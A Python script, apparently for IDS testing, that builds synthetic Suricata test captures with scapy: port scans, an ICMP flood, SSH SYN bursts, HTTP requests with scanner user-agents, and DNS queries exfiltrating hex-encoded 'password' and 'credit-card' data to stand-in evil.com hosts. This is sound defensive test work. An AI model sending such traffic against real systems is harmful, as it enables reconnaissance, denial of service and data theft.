#!/usr/bin/env python3
"""
generate_test_traffic.py — Build PCAP files containing simulated attacks
for Suricata IDS testing.

Creates five PCAPs, each exercising a different detection rule:
  1. TCP SYN port scan (sequential ports 20-1024)
  2. ICMP flood (100+ pings in rapid succession)
  3. SSH brute-force (many connections to port 22)
  4. HTTP with suspicious user-agent (known scanner strings)
  5. DNS exfiltration (unusually long subdomain labels)

Packets include realistic timestamps so Suricata's threshold
engine can count events-per-window correctly.

These are SYNTHETIC — no real network is attacked.
"""
from scapy.all import (
    IP, TCP, UDP, ICMP, DNS, DNSQR, Raw, Ether,
    wrpcap, RandShort, RandIP
)
import os, sys, time

OUTDIR = os.path.join(os.path.dirname(__file__), "pcaps")
os.makedirs(OUTDIR, exist_ok=True)

SRC = "203.0.113.50"     # simulated attacker (RFC 5737 TEST-NET-3, outside HOME_NET)
DST = "192.168.1.100"   # simulated target (HOME_NET)


def _set_times(pkts, start=1716300000.0, interval=0.01):
    """Give each packet a realistic, sequential timestamp."""
    for i, pkt in enumerate(pkts):
        pkt.time = start + i * interval
    return pkts


def build_port_scan():
    """TCP SYN scan across 200 ports — mimics nmap -sS."""
    pkts = []
    for port in range(20, 220):
        pkt = (
            IP(src=SRC, dst=DST)
            / TCP(sport=RandShort(), dport=port, flags="S")
        )
        pkts.append(pkt)
    _set_times(pkts, interval=0.05)  # 200 SYNs in 10 seconds
    path = os.path.join(OUTDIR, "port_scan.pcap")
    wrpcap(path, pkts)
    print(f"  [+] port_scan.pcap          — {len(pkts)} SYN packets to ports 20-219")
    return path


def build_icmp_flood():
    """100 ICMP echo-requests in a burst — classic ping flood."""
    pkts = []
    for i in range(100):
        pkt = (
            IP(src=SRC, dst=DST)
            / ICMP(type=8, id=0xABCD, seq=i)
            / Raw(load=b"X" * 1024)
        )
        pkts.append(pkt)
    _set_times(pkts, interval=0.05)  # 100 pings in 5 seconds
    path = os.path.join(OUTDIR, "icmp_flood.pcap")
    wrpcap(path, pkts)
    print(f"  [+] icmp_flood.pcap         — {len(pkts)} ICMP echo-request packets (1 KB each)")
    return path


def build_ssh_bruteforce():
    """Many TCP SYN packets to port 22 from the same source — brute-force pattern."""
    pkts = []
    for i in range(50):
        pkts.append(
            IP(src=SRC, dst=DST)
            / TCP(sport=RandShort(), dport=22, flags="S")
        )
    _set_times(pkts, interval=0.5)  # 50 SYNs over 25 seconds
    path = os.path.join(OUTDIR, "ssh_bruteforce.pcap")
    wrpcap(path, pkts)
    print(f"  [+] ssh_bruteforce.pcap     — {len(pkts)} SYN packets to port 22")
    return path


def build_http_scanner():
    """
    HTTP GET requests with suspicious scanner user-agents.
    Builds full TCP handshakes so Suricata sees established flows
    and can inspect HTTP headers.
    """
    agents = [
        b"Nikto/2.1.6",
        b"sqlmap/1.7",
        b"Mozilla/5.0 (compatible; Nmap Scripting Engine)",
        b"DirBuster-1.0-RC1",
        b"gobuster/3.6",
    ]
    pkts = []
    base_sport = 40000
    t = 1716300000.0

    for idx, ua in enumerate(agents):
        sport = base_sport + idx
        seq_c = 1000 + idx * 10000
        seq_s = 5000 + idx * 10000

        # SYN (client -> server)
        syn = IP(src=SRC, dst=DST) / TCP(sport=sport, dport=80, flags="S", seq=seq_c)
        syn.time = t
        pkts.append(syn)
        t += 0.001

        # SYN-ACK (server -> client)
        syn_ack = IP(src=DST, dst=SRC) / TCP(sport=80, dport=sport, flags="SA", seq=seq_s, ack=seq_c + 1)
        syn_ack.time = t
        pkts.append(syn_ack)
        t += 0.001

        # ACK (client -> server)
        ack = IP(src=SRC, dst=DST) / TCP(sport=sport, dport=80, flags="A", seq=seq_c + 1, ack=seq_s + 1)
        ack.time = t
        pkts.append(ack)
        t += 0.001

        # HTTP GET with scanner user-agent
        payload = (
            b"GET /admin HTTP/1.1\r\n"
            b"Host: 192.168.1.100\r\n"
            b"User-Agent: " + ua + b"\r\n"
            b"Accept: */*\r\n"
            b"\r\n"
        )
        http_req = (
            IP(src=SRC, dst=DST)
            / TCP(sport=sport, dport=80, flags="PA", seq=seq_c + 1, ack=seq_s + 1)
            / Raw(load=payload)
        )
        http_req.time = t
        pkts.append(http_req)
        t += 0.5

    path = os.path.join(OUTDIR, "http_scanner.pcap")
    wrpcap(path, pkts)
    print(f"  [+] http_scanner.pcap       — {len(pkts)} packets ({len(agents)} HTTP requests with scanner UAs)")
    return path


def build_dns_exfil():
    """DNS queries with very long subdomain labels — exfiltration indicator."""
    pkts = []
    exfil_labels = [
        "6162636465666768696a6b6c6d6e6f707172.data.evil.com",
        "73746f6c656e2d646174612d6368756e6b31.c2.evil.com",
        "70617373776f72643d6d79736563726574.exfil.evil.com",
        "64617461626173652d64756d702d726f7731.out.evil.com",
        "6372656469742d636172642d31323334.leak.evil.com",
    ]
    for label in exfil_labels:
        pkt = (
            IP(src=DST, dst="8.8.8.8")
            / UDP(sport=RandShort(), dport=53)
            / DNS(rd=1, qd=DNSQR(qname=label, qtype="A"))
        )
        pkts.append(pkt)
    _set_times(pkts, interval=1.0)
    path = os.path.join(OUTDIR, "dns_exfil.pcap")
    wrpcap(path, pkts)
    print(f"  [+] dns_exfil.pcap          — {len(pkts)} DNS queries with long hex-encoded subdomains")
    return path


def build_combined():
    """Merge all attacks into one PCAP for a combined test run."""
    from scapy.all import rdpcap
    all_pkts = []
    base_time = 1716300000.0
    offset = 0.0
    for name in ["port_scan.pcap", "icmp_flood.pcap", "ssh_bruteforce.pcap",
                  "http_scanner.pcap", "dns_exfil.pcap"]:
        fpath = os.path.join(OUTDIR, name)
        if os.path.exists(fpath):
            file_pkts = rdpcap(fpath)
            for pkt in file_pkts:
                pkt.time = pkt.time + offset
                all_pkts.append(pkt)
            offset += 30.0  # 30-second gap between attack phases
    path = os.path.join(OUTDIR, "combined_attacks.pcap")
    wrpcap(path, all_pkts)
    print(f"  [+] combined_attacks.pcap   — {len(all_pkts)} total packets (all attack types)")
    return path


if __name__ == "__main__":
    print("Generating synthetic attack PCAPs...")
    build_port_scan()
    build_icmp_flood()
    build_ssh_bruteforce()
    build_http_scanner()
    build_dns_exfil()
    build_combined()
    print(f"\nAll PCAPs written to {OUTDIR}/")
    print("These are synthetic — no real network was attacked.")
